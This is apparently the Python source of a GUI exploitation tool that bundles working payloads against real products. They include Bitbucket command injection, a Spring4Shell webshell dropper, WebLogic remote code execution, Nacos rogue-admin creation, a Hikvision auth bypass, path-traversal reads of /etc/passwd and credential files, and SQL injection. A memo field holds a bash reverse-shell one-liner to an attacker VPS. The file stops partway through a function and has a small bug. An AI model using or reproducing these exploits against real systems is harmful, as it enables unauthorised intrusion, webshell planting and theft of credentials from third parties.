import requests
import re
import wx
import base64
import http.client
import urllib3
from bs4 import BeautifulSoup
headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Frame(wx.Frame):
    def __init__(self):
        wx.Frame.__init__(self, parent=None, title="Capricornus Bata 1.2 by qiwentaidi", size=(800, 675), style=541072896)
        self.panel = wx.Panel(self)
        self.Centre()
        '''
        创建控件
        '''
        self.vul_list = wx.CheckListBox(self.panel, size=(210, 495), name='listBox',
                                        choices=['Atlassian Bitbucket Server远程命令执行CVE-2022-36804',
                                                 'Spring4shell远程代码执行CVE-2022-22965',
                                                 'Omnia MPX文件读取漏洞CVE-2022-36642',
                                                 'M7S任意文件读取',
                                                 'Metabase 任意文件读取CVE-2021-41277',
                                                 'Teleport堡垒机do-login任意用户登录漏洞',
                                                 'Hikvision身份认证绕过',
                                                 '孚盟云AjaxMethod.ashx SQL注入',
                                                 'Alibaba Nacos 未授权访问漏洞',
                                                 '安恒明御WEB应用防火墙report.php任意用户登录',
                                                 '大华城市安防监控系统平台管理任意文件下载漏洞',
                                                 '迪普VPN任意文件读取漏洞',
                                                 'Weblogic CVE-2020-14882',
                                                 '泛微E-Cology HrmCareerApplyPerView.jsp SQL注入',
                                                 'VMware vCenter vid 任意文件读取漏洞',
                                                 'Spring未授权访问漏洞',
                                                 'GLPI htmLawedTest.php远程命令执行漏洞CVE-2022-35914'], style=1073742336)
        # 结果输出文本框
        self.result_TextCtrl = wx.TextCtrl(self.panel, size=(575, 495), style=1073741856)
        # 加密按钮
        self.Encryption_Button = wx.Button(self.panel, label="加密", id=4)
        # 解密按钮
        self.Decrypt_Button = wx.Button(self.panel, label="解密", id=5)
        # 备忘录文本框
        self.memorandum_TextCtrl = wx.TextCtrl(self.panel, size=(350, 50), style=1073741856,
                                               value="反弹: /bin/bash -i >& /dev/tcp/<your_vps>/1024 0>&1")
        # base64加解密
        self.base64_TextCtrl = wx.TextCtrl(self.panel, size=(350, 50), style=1073741856,
                                           value="base64加解密")
        self.StaticMemorandum = wx.TextCtrl(self.panel, value="备忘录", size=(50,50))
        self.StaticMemorandum.Disable()
        self.StaticTYPE = wx.TextCtrl(self.panel, size=(60, 25), value="漏洞类型", style=0)
        self.StaticTYPE.Disable()
        self.StaticURL = wx.TextCtrl(self.panel, size=(50, 25), value="URL:")
        self.StaticURL.Disable()
        self.StaticCMD = wx.TextCtrl(self.panel, size=(50, 25), value="CMD:")
        self.StaticCMD.Disable()
        self.StaticPROXY = wx.TextCtrl(self.panel, size=(50, 25), value="Proxy:")
        self.StaticPROXY.Disable()
        # 代理文本框
        self.Proxy_TextCtrl = wx.TextCtrl(self.panel, size=(400, 25), value='http://127.0.0.1:7890')
        # URL文本框
        self.URL_TextCtrl = wx.TextCtrl(self.panel, size=(400, 25))
        # 命令文本框
        self.CMD_TextCtrl = wx.TextCtrl(self.panel, size=(400, 25), value='whoami')
        # 代理测试按钮
        self.Proxy_Button = wx.Button(self.panel, size=(192, 25), label="测试连通性", id=6)
        # 开始检测按钮
        self.Start_Button = wx.Button(self.panel, size=(150, 80), label="开始检测", id=1)
        # 全选漏洞漏洞按钮
        self.CheckAll_Button = wx.Button(self.panel, size=(95, 25), label="全选", id=2)
        # 取消全选漏洞漏洞按钮
        self.CancelAll_Button = wx.Button(self.panel, size=(95, 25), label="取消全选", id=3)
        # 筛选漏洞类型
        self.scrennList = wx.ComboBox(self.panel, size=(130, 35), choices=['WEB应用', '网络设备', '堡垒机', '中间件', '开发框架', '服务器应用', 'OA', 'CMS', 'ALL'], style=16)
        self.scrennList.SetValue('ALL')
        '''
        控件布局设置
        '''
        wbox1 = wx.BoxSizer()
        wbox2 = wx.BoxSizer()
        wbox3 = wx.BoxSizer()
        wbox4 = wx.BoxSizer()
        wbox5 = wx.BoxSizer()
        wbox6 = wx.BoxSizer()
        vbox1 = wx.BoxSizer(wx.VERTICAL)
        vbox2 = wx.BoxSizer(wx.VERTICAL)
        vbox_max = wx.BoxSizer(wx.VERTICAL)
        wbox1.Add(self.CheckAll_Button, border=1, flag=wx.ALL)
        wbox1.Add(self.CancelAll_Button, border=1, flag=wx.ALL)
        wbox1.Add(self.StaticURL, border=1, flag=wx.ALL)
        wbox1.Add(self.URL_TextCtrl, border=1, flag=wx.ALL)
        wbox2.Add(self.StaticTYPE, border=1, flag=wx.ALL)
        wbox2.Add(self.scrennList, border=1, flag=wx.ALL)
        wbox2.Add(self.StaticCMD, border=1, flag=wx.ALL)
        wbox2.Add(self.CMD_TextCtrl, border=1, flag=wx.ALL)
        wbox6.Add(self.Proxy_Button, border=1, flag=wx.ALL)
        wbox6.Add(self.StaticPROXY, border=1, flag=wx.ALL)
        wbox6.Add(self.Proxy_TextCtrl, border=1, flag=wx.ALL | wx.EXPAND)
        vbox1.Add(wbox1)
        vbox1.Add(wbox6)
        vbox1.Add(wbox2)
        wbox3.Add(vbox1)
        wbox3.Add(self.Start_Button, border=1, flag=wx.ALL)
        wbox4.Add(self.vul_list)
        wbox4.Add(self.result_TextCtrl)
        vbox2.Add(self.Encryption_Button, border=1, flag=wx.ALL)
        vbox2.Add(self.Decrypt_Button, border=1, flag=wx.ALL)
        wbox5.Add(self.StaticMemorandum, border=1, flag=wx.ALL)
        wbox5.Add(self.memorandum_TextCtrl, border=1, flag=wx.ALL)
        wbox5.Add(vbox2)
        wbox5.Add(self.base64_TextCtrl, border=1, flag=wx.ALL)
        vbox_max.Add(wbox3)
        vbox_max.Add(wbox4)
        vbox_max.Add(wbox5)
        self.panel.SetSizer(vbox_max)
        '''
        事件绑定
        '''
        # check all按钮绑定全选漏洞事件
        self.Bind(wx.EVT_BUTTON, self.all_checked, id=2)
        # cancel all绑定取消全选漏洞事件
        self.Bind(wx.EVT_BUTTON, self.not_checked, id=3)
        # start按钮绑定开始检测漏洞事件
        self.Bind(wx.EVT_BUTTON, self.check_vul, id=1)
        # 加密按钮绑定base64加密事件
        self.Bind(wx.EVT_BUTTON, self.base64_encode, id=4)
        # 解密按钮绑定base64解密事件
        self.Bind(wx.EVT_BUTTON, self.base64_decode, id=5)
        # 组合框选择绑定漏洞筛选事件
        self.Bind(wx.EVT_COMBOBOX, self.screen_vul)
        # 测试连通性按钮绑定ping百度事件
        self.Bind(wx.EVT_BUTTON, self.check_proxy, id=6)

    # 全选漏洞
    def all_checked(self, event):
        count = self.vul_list.GetCount()
        self.vul_list.SetCheckedItems(range(0, count))

    # 取消全选
    def not_checked(self, event):
        self.vul_list.SetCheckedItems([])

    # 代理测试
    def check_proxy(self, event):
        proxy_value = self.Proxy_TextCtrl.GetValue()
        proxy = {
            'http:':f'{proxy_value}'
        }
        obj = re.compile('target="_blank">(?P<ip>.*?)</a> <a href="https://www.ipshudi.com/"(.*?)</a>] (?P<loaction>.*?)</p>', re.S)
        try:
            resp = requests.get(url='http://www.baidu.com', headers=headers, verify=False, timeout=5, proxies=proxy)

            if resp.status_code == 200:
                self.result_TextCtrl.Clear()
                self.result_TextCtrl.WriteText('ping http://www.baidu.com 测试成功\n')
                resp1 = requests.get(url='https://2022.ip138.com/', headers=headers, verify=False, timeout=3).content.decode('utf-8')
                result = re.findall(obj, resp1)
                self.result_TextCtrl.WriteText(f'{result[0][0]}\n')
                self.result_TextCtrl.WriteText(f'{result[0][2]}\n')
            else:
                self.result_TextCtrl.WriteText('连接超时')
        except Exception:
            self.result_TextCtrl.WriteText('连接超时')

    # 筛选漏洞类型
    def screen_vul(self, event):
        # 获取漏洞筛选列表的值
        value = self.scrennList.GetValue()
        if value == 'WEB应用':
            self.vul_list.Clear()
            self.vul_list.Append('孚盟云AjaxMethod.ashx SQL注入')
            self.vul_list.Append('Alibaba Nacos 未授权访问漏洞')
            self.vul_list.Append('M7S任意文件读取')
            self.vul_list.Append('Metabase 任意文件读取CVE-2021-41277')
            self.vul_list.Append('Telos Alliance Omnia MPX Node Overview文件读取漏洞')
            self.vul_list.Append('Atlassian Bitbucket Server远程命令执行CVE-2022-36804')
            self.vul_list.Append('GLPI htmLawedTest.php远程命令执行漏洞CVE-2022-35914')
        elif value == '网络设备':
            self.vul_list.Clear()
            self.vul_list.Append('Hikvision身份认证绕过')
            self.vul_list.Append('安恒明御WEB应用防火墙report.php任意用户登录')
            self.vul_list.Append('大华城市安防监控系统平台管理任意文件下载漏洞')
            self.vul_list.Append('迪普VPN任意文件读取漏洞')
        elif value == '中间件':
            self.vul_list.Clear()
            self.vul_list.Append('Weblogic CVE-2020-14882')
        elif value == '堡垒机':
            self.vul_list.Clear()
            self.vul_list.Append('Teleport堡垒机do-login任意用户登录漏洞')
            self.vul_list.Append('VMware vCenter vid 任意文件读取漏洞')
        elif value == '开发框架':
            self.vul_list.Clear()
            self.vul_list.Append('Spring4shell远程代码执行CVE-2022-22965')
            self.vul_list.Append('Spring未授权访问漏洞')
        elif value == '服务器应用':
            self.vul_list.Clear()
        elif value == 'OA':
            self.vul_list.Clear()
            self.vul_list.Append('泛微E-Cology HrmCareerApplyPerView.jsp SQL注入')
        elif value == 'CMS':
            self.vul_list.Clear()
        elif value == 'ALL':
            self.vul_list.Clear()
            self.vul_list.Append('孚盟云AjaxMethod.ashx SQL注入')
            self.vul_list.Append('Alibaba Nacos 未授权访问漏洞')
            self.vul_list.Append('M7S任意文件读取')
            self.vul_list.Append('Metabase 任意文件读取CVE-2021-41277')
            self.vul_list.Append('Omnia MPX文件读取漏洞CVE-2022-36642')
            self.vul_list.Append('Atlassian Bitbucket Server远程命令执行CVE-2022-36804')
            self.vul_list.Append('Hikvision身份认证绕过')
            self.vul_list.Append('安恒明御WEB应用防火墙report.php任意用户登录')
            self.vul_list.Append('大华城市安防监控系统平台管理任意文件下载漏洞')
            self.vul_list.Append('迪普VPN任意文件读取漏洞')
            self.vul_list.Append('Weblogic CVE-2020-14882')
            self.vul_list.Append('Teleport堡垒机do-login任意用户登录漏洞')
            self.vul_list.Append('VMware vCenter vid 任意文件读取漏洞')
            self.vul_list.Append('Spring4shell远程代码执行CVE-2022-22965')
            self.vul_list.Append('泛微E-Cology HrmCareerApplyPerView.jsp SQL注入')
            self.vul_list.Append('Spring未授权访问漏洞')
            self.vul_list.Append('GLPI htmLawedTest.php远程命令执行漏洞CVE-2022-35914')
        # base64加密

    def base64_encode(self, event):
        encode_item = self.base64_TextCtrl.GetValue().encode('utf-8')
        base64encode_result = base64.b64encode(encode_item).decode('utf-8')
        self.base64_TextCtrl.Clear()
        self.base64_TextCtrl.AppendText(base64encode_result)

        # base64解密

    def base64_decode(self, event):
        try:
            decode_item = self.base64_TextCtrl.GetValue().encode('utf-8')
            base64decode_result = base64.b64decode(decode_item).decode('utf-8')
            self.base64_TextCtrl.Clear()
            self.base64_TextCtrl.AppendText(base64decode_result)
        except Exception:
            self.base64_TextCtrl.Clear()
            self.base64_TextCtrl.AppendText('该参数无法解密')

    def check_vul(self, event):
        # 清空结果输出框
        self.result_TextCtrl.Clear()
        # 返回检测对象的名称，返回类型为元组
        vuls_name = self.vul_list.GetCheckedStrings()
        # 获取当前URL
        url = self.URL_TextCtrl.GetValue().rstrip('/')
        # 获取当前执行的命令
        cmd = self.CMD_TextCtrl.GetValue()
        # 通过循环vul_items获取需要检测的漏洞列表，if判断后进行检测
        if url != "":
            try:
                for vul_name in vuls_name:
                    if vul_name == 'Atlassian Bitbucket Server远程命令执行CVE-2022-36804':
                        self.result_TextCtrl.WriteText(f'[!]正在检测Atlassian Bitbucket Server CVE-2022-36804\n')
                        result = CVE_2022_36804().__int__(url=url, cmd=cmd)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'Spring4shell远程代码执行CVE-2022-22965':
                        self.result_TextCtrl.WriteText('[!]正在测试Spring4shell漏洞\n')
                        result = CVE_2022_22965().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'Telos Alliance Omnia MPX Node Overview文件读取漏洞':
                        self.result_TextCtrl.WriteText(
                            '[!]正在测试Telos Alliance Omnia MPX Node Overview 文件读取漏洞\n')
                        result = MPX_Fileread().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'M7S任意文件读取':
                        self.result_TextCtrl.WriteText('[!]正在测试M7S任意文件读取漏洞\n')
                        result = M7S_Fileread().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'Metabase 任意文件读取CVE-2021-41277':
                        self.result_TextCtrl.WriteText('[!]正在测试Metabase任意文件读取漏洞\n')
                        result = Metabase_Fileread().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'Teleport堡垒机do-login任意用户登录漏洞':
                        self.result_TextCtrl.WriteText('[!]正在测试TELEPORT登录认证漏洞\n')
                        result = TELEPORT_auth_bypass().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'Hikvision身份认证绕过':
                        self.result_TextCtrl.WriteText('[!]正在测试Hikvision身份认证绕过漏洞CVE-2017-7921\n')
                        result = CVE_2017_7921().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == '孚盟云AjaxMethod.ashx SQL注入':
                        self.result_TextCtrl.WriteText('[!]正在测试孚盟云SQL注入漏洞\n')
                        result = FMY_SQL().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'Alibaba Nacos 未授权访问漏洞':
                        self.result_TextCtrl.WriteText('[!]正在测试nacos未授权访问漏洞\n')
                        result = Nacos_auth_bypass().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == '安恒明御WEB应用防火墙report.php任意用户登录':
                        self.result_TextCtrl.WriteText('[!]正在测试安恒明御WEB应用防火墙report.php任意用户登录漏洞\n')
                        result = AH_Mywaf_auth_bypass().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == '大华城市安防监控系统平台管理任意文件下载漏洞':
                        self.result_TextCtrl.WriteText('[!]正在测试大华城市安防监控系统平台管理任意文件下载漏洞\n')
                        result = DH_Fileread().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == '迪普VPN任意文件读取漏洞':
                        self.result_TextCtrl.WriteText('[!]正在测试迪普VPN任意文件读取漏洞\n')
                        result = DP_VPN_Fileread().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'Weblogic CVE-2020-14882':
                        self.result_TextCtrl.WriteText('[!]正在测试Weblogic CVE-2020-14882漏洞\n')
                        result = CVE_2020_14882().__int__(url=url, cmd=cmd)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == '泛微E-Cology HrmCareerApplyPerView.jsp SQL注入':
                        self.result_TextCtrl.WriteText(
                            '[!]正在测试泛微E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞\n')
                        result = FW_E_Cology_HrmCareerApplyPerView_SQL().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'VMware vCenter vid 任意文件读取漏洞':
                        self.result_TextCtrl.WriteText('[!]正在测试VMware vCenter vid 任意文件读取漏洞\n')
                        result = VCenter_Fireread().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'Spring未授权访问漏洞':
                        self.result_TextCtrl.WriteText('[!]正在测试Spring未授权访问漏洞\n')
                        result = Spring_auth_bypass().__int__(url=url)
                        self.result_TextCtrl.WriteText(f'{result}')
                    if vul_name == 'GLPI htmLawedTest.php远程命令执行漏洞CVE-2022-35914':
                        self.result_TextCtrl.WriteText('[!]正在测试GLPI htmLawedTest.php远程命令执行漏洞CVE-2022-35914\n')
                        result = CVE_2022_35914().__int__(url=url, cmd=cmd)
                        self.result_TextCtrl.WriteText(f'{result}')
            except Exception as e:
                self.result_TextCtrl.WriteText(e)
        else:
            self.result_TextCtrl.WriteText(f'请输入需要检测的漏洞地址')


'''
漏洞名称:
Atlassian Bitbucket Server CVE-2022-36804
影响版本:
Atlassian Bitbucket 7.0～8.3
'''


class CVE_2022_36804:
    def __int__(self, url, cmd):
        test_url = f'{url}/repos?visibility=public'
        try:
            resp = requests.get(test_url, headers=headers, verify=False, timeout=5).text
            title = re.findall('<title>(.*?)</title>', resp)
            vul_url = re.findall(',"self":\[\{"href":"(.*?)/browse"}]}}', resp)
            if title[0] == 'Public Repositories - Bitbucket':
                projects = vul_url[0].split(url, 2)[1]
                poc = f'/rest/api/latest{projects}/archive?filename=wN3Am&at=wN3Am&path=wN3Am&prefix=ax%00--exec=%60{cmd}%60%00--remote=origin'
                result = requests.get(url=f'{url}{poc}', headers=headers, verify=False, timeout=5)
                final_result = re.findall('1: (.*?):', result.text)
                if result.status_code == 500:
                    return f'[+]{final_result[0]}\n'
                else:
                    return '[-]不存在CVE-2022-36804漏洞\n'
            else:
                return '[-]不存在CVE-2022-36804漏洞\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
Spring4shell 远程代码执行漏洞 CVE-2022-22965
影响版本:
1、JDK ≥ 9
2、Spring Framework 版本为5.3.0 - 5.3.17，5.2.0 - 5.2.19或更旧的版本
'''


class CVE_2022_22965:
    def __int__(self, url):
        spring4shell_poc = '?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
        spring4shell_headers = {
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
        }
        try:
            requests.get(f'{url}{spring4shell_poc}', headers=spring4shell_headers, verify=False, timeout=3)
            shell_url = f'{url}/tomcatwar.jsp?pwd=j&cmd=whoami'
            resp = requests.get(url=shell_url, headers=headers, verify=False, timeout=3)
            if resp.status_code == 200:
                return f'[+]存在Spring4shell漏洞，shell地址为:\n{shell_url}\n'
            else:
                return '[-]不存在Spring4shell漏洞\n'
        except Exception as reason:
            return f'{reason}\n'


class M7S_Fileread:
    def __int__(self, url):
        m7s_poc = '/api/logrotate/download?file=../../../../../../../etc/passwd'
        try:
            resp = requests.get(f'{url}{m7s_poc}', headers=headers, verify=False, timeout=3)
            if resp.status_code == 200:
                if resp.text[0:4] == 'root':
                    return f'[+]MS7任意文件读取漏洞存在\n漏洞地址:\n{url}{m7s_poc}\n{resp.text}\n'
                else:
                    return f'[-]不存在MS7任意文件读取漏洞存在\n'
            else:
                return f'[-]不存在MS7任意文件读取漏洞存在\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
Metabase任意文件读取 CVE-2021-41277
影响版本:
metabase version < 0.40.5
metabase version >= 1.0.0, < 1.40.5
'''


class Metabase_Fileread:
    def __int__(self, url):
        metabase_poc = '/api/geojson?url=file:////etc/passwd'
        try:
            resp = requests.get(f'{url}{metabase_poc}', headers=headers, verify=False, timeout=3)
            if resp.status_code == 200:
                return f'[+]Metabase任意文件读取漏洞存在\n漏洞地址:\n{url}{metabase_poc}\n{resp.text}\n'
            else:
                return '[-]不存在Metabase任意文件读取漏洞\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
Teleport堡垒机 do-login 任意用户登录漏洞
影响版本:
Teleport Version <= 20220817
'''


class TELEPORT_auth_bypass:
    def __int__(self, url):
        teleport_poc = '/auth/do-login'
        try:
            resp = requests.get(f'{url}{teleport_poc}', headers=headers, timeout=3)
            if resp.status_code == 405:
                return '[!!]/auth/do-login状态码为405,请自行确认\nEXP地址:https://github.com/qiwentaidi/TELEPORT-EXP\n'
            else:
                return '[-]不存在TELEPORT身份认证绕过漏洞\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
海康威视身份认证绕过CVE-2017-7921
影响版本:
HikvisionDS-2CD2xx2F-ISeries5.2.0build140721
版本至5.4.0build160530版本；
DS-2CD2xx0F-ISeries5.2.0build140721
版本至5.4.0Build160401版本；
DS-2CD2xx2FWDSeries5.3.1build150410
版本至5.4.4Build161125版本；
DS-2CD4x2xFWDSeries5.2.0build140721
版本至5.4.0Build160414版本；
DS-2CD4xx5Series5.2.0build14072
版本至5.4.0Build160421版本；
DS-2DFxSeries5.2.0build140805
版本至5.4.5Build160928版本；
DS-2CD63xxSeries5.0.9build140305
版本至5.3.5Build160106版本
'''


class CVE_2017_7921:
    def __int__(self, url):
        cve_2017_7921_poc = '/Security/users?auth=YWRtaW46MTEK'
        try:
            resp = requests.get(f'{url}{cve_2017_7921_poc}', headers=headers, verify=False, timeout=3)
            if resp.status_code == 200:
                return f'[+]存在Hikvision认证绕过漏洞\n快照地址为:{url}/onvif-http/snapshot?auth=YWRtaW46MTEK\n配置文件地址:\n{url}/System/configurationFile?auth=YWRtaW46MTEK'
            else:
                return '不存在Hikvision认证绕过漏洞\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
Omnia MPX文件读取漏洞CVE-2022-36642
影响版本:
Telos Alliance Omnia MPX 1.5.0+r1版本及之前版本
'''


class MPX_Fileread:
    def __int__(self, url):
        mpx_poc = '/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json'
        try:
            resp = requests.get(f'{url}{mpx_poc}', headers=headers, verify=False, timeout=3)
            if resp.status_code == 200:
                return f'[+]Omnia MPX文件读取漏洞CVE-2022-36642存在\n{resp.text}\n'
            else:
                return '[-]不存在Omnia MPX文件读取漏洞CVE-2022-36642\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
孚盟云SQL注入CNVD-2021-25330
'''


class FMY_SQL:
    def __int__(self, url):
        poc = '/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27'
        try:
            resp = requests.get(f'{url}{fmy_poc}', headers=headers, verify=False, timeout=3)
            str1 = '附近有语法错误'
            if resp.status_code == 500:
                if resp.text.rfind(str1) != -1:
                    return f'[+]孚盟云SQL注入存在\n漏洞地址为:\n{url}{poc}\n'
                else:
                    return f'[-]不存在孚盟云SQL注入漏洞\n'
            else:
                return f'[-]不存在孚盟云SQL注入漏洞\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
nacos未授权访问
影响版本:
Nacos <= 2.0.0-ALPHA.1
'''


class Nacos_auth_bypass:
    def __int__(self, url):
        nacos_poc = '/nacos/v1/auth/users?'
        nacos_headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = 'username=qiwentaidi&password=qiwentaidi123'
        try:
            resp = requests.post(url=f'{url}{nacos_poc}', headers=nacos_headers, data=data, verify=False, timeout=3)
            if resp.text.find('create user ok!') != -1:
                return f'[+]存在nacos未授权访问漏洞\n用户名为:qiwentaidi\n密码为:qiwentaidi123\n'
            else:
                return '[-]不存在nacos未授权访问漏洞\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
安恒明御WEB防火墙任意用户登录
'''


class AH_Mywaf_auth_bypass:
    def __int__(self, url):
        mywaf_poc = '/report.m?a=rpc-timed'
        try:
            resp = requests.get(url=f'{url}{mywaf_poc}', headers=headers, verify=False, timeout=3)
            if resp.status_code == 200:
                if resp.text == 'error_0x110005':
                    return f'[+]存在安恒明御WEB应用防火墙report.php任意用户登录漏洞\n漏洞地址:\n先访问 {url}{mywaf_poc}\n再访问 {url}/\n'
                else:
                    return f'[-]不存在安恒明御WEB应用防火墙report.php任意用户登录漏洞\n'
            else:
                return f'[-]不存在安恒明御WEB应用防火墙report.php任意用户登录漏洞\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
大华城市安防监控系统平台管理任意文件下载
'''


class DH_Fileread:
    def __int__(self, url):
        dh_fileread_poc = '/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd'
        try:
            resp = requests.get(url=f'{url}{dh_fileread_poc}', headers=headers, verify=False, timeout=3)
            if resp.status_code == 200:
                if resp.text[0:4] == 'root':
                    return f'[+]大华城市安防监控系统平台管理任意文件下载漏洞存在\n漏洞地址:\n{url}{dh_fileread_poc}\n{resp.text}\n'
                else:
                    return f'[-]不存在大华城市安防监控系统平台管理任意文件下载漏洞'
            else:
                return f'[-]不存在大华城市安防监控系统平台管理任意文件下载漏洞'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
迪普VPN任意文件读取
'''


class DP_VPN_Fileread:
    def __int__(self, url):
        dp_fileread_poc = '/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
        try:
            resp = requests.get(url=f'{url}{dp_fileread_poc}', headers=headers, verify=False, timeout=3)
            if resp.status_code == 200:
                if resp.text[0:4] == 'root':
                    return f'[+]迪普VPN任意文件读取漏洞存在\n漏洞地址:\n{url}{dp_fileread_poc}\n{resp.text}\n'
                else:
                    return f'[-]不存在迪普VPN任意文件读取漏洞'
            else:
                return f'[-]不存在迪普VPN任意文件读取漏洞'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
CVE_2020_14882
影响版本:
Oracle Weblogic Server 10.3.6.0.0
Oracle Weblogic Server 12.1.3.0.0
Oracle Weblogic Server 12.2.1.3.0
Oracle Weblogic Server 12.2.1.4.0
Oracle Weblogic Server 14.1.1.0.0
'''


class CVE_2020_14882:
    def __int__(self, url, cmd):
        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
        cve_2020_14882_poc1 = ('_nfpb=true&_pageLabel=&handle='
                               'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
                               '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
                               'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
                               '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
                               '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
                               'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
                               'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
                               '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
                               '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
                               '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
                               'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
                               'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
                               'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')
        cve_2020_14882_headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'cmd': cmd
        }
        path = '/console/css/%252e%252e%252fconsole.portal'
        try:
            resp = requests.post(url=f'{url}{path}', data=cve_2020_14882_poc1, headers=cve_2020_14882_headers, verify=False, timeout=3)
            if resp.status_code == 200:
                return f'[+]存在Weblogic CVE_2020_14882漏洞,正在调用payload1，适用于Weblogic 12.2.1.3.0以上\n{resp.text}'
            else:
                return f'[-]不存在Weblogic CVE_2020_14882漏洞'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞
'''


class FW_E_Cology_HrmCareerApplyPerView_SQL:
    def __int__(self, url):
        poc = "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
        try:
            resp = requests.get(url=f'{url}{poc}', headers=headers, verify=False, timeout=3)
            if resp.status_code == 200:
                if resp.text.find('个人信息') != -1:
                    return f'[+]存在泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞\n漏洞地址为:\n{url}{poc}'
                else:
                    return f'[-]不存在泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞'
            else:
                return f'[-]不存在泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
VMware vCenter vid 任意文件读取漏洞
影响版本:
VMware vCenter Server 6.5.0a- f 版本
'''


class VCenter_Fireread:
    def __int__(self, url):
        win_poc = r'/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties'
        linux_poc = r'/eam/vib?id=/etc/passwd'
        try:
            resp_linux = requests.get(url=f'{url}{linux_poc}', headers=headers, verify=False, timeout=3)
